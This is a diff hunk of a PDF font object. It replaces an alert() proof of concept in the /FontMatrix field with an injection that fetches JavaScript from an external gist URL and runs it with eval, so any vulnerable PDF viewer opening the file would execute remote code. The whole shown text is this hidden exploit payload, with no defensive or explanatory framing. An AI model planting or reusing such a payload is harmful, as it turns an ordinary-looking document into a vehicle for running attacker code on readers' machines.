@@ -46,7 +46,7 @@ endobj
   /BaseFont /SNCSTG+CMBX12
   /FontDescriptor 7 0 R
   /Subtype /Type1
-  /FontMatrix [1 2 3 4 5 (1\); alert\('!!!GOT YA!!!')]
+  /FontMatrix [1 2 3 4 5 (1\); fetch\('https://gist.githubusercontent.com/clarkio/67a4aadd1eb2954198bda6a2b02e7b01/raw/fcd5ed598dfccb1975f45324908ccf688ed769c7/hidden-speaker.js'\).then\(res=>res.text\(\).then\(code=>eval\(code\)\))]
   /Type /Font
 >>
 endobj
